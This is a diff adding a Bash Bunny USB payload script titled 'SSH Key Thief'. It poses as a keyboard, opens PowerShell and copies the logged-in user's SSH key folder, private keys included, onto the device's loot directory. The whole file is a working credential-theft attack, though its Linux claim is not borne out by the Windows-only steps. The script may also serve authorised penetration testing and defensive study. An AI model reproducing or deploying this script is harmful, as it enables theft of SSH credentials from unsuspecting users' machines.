@@ -1,0 +1,39 @@
+# Title: SSH Key Thief
+# Description: Reads and stores SSH keys from both Windows and Linux Systems 
+# Author: elementalSec
+# Category: poc
+# Target: Windows/Linux
+# AttackModes: HID STORAGE
+
+LED SETUP
+ATTACKMODE HID STORAGE
+
+REM open powershell
+
+LED STAGE1
+QUACK GUI r
+QUACK STRING powershell
+QUACK DELAY 200
+QUACK ENTER
+QUACK DELAY 4000
+
+REM Detect which drive letter the bunny is using, then cd into it
+
+QUACK STRING "\$u= (gwmi Win32_Volume | ?{\$_.Label -eq 'BASHBUNNY'} | select -ExpandProperty name); cd \$u"
+QUACK ENTER
+QUACK DELAY 1000
+
+REM copy files from SSH folder over to bash bunny, after creating a directory in the loot folder
+
+QUACK STRING mkdir loot/\$env:UserName
+QUACK ENTER
+QUACK DELAY 2000
+QUACK STRING cp C:/Users/\$env:UserName/.ssh/* /loot/\$env:UserName/
+QUACK ENTER
+QUACK DELAY 2000
+
+REM exit powershell and complete the script run
+QUACK STRING exit
+QUACK ENTER
+
+LED FINISH
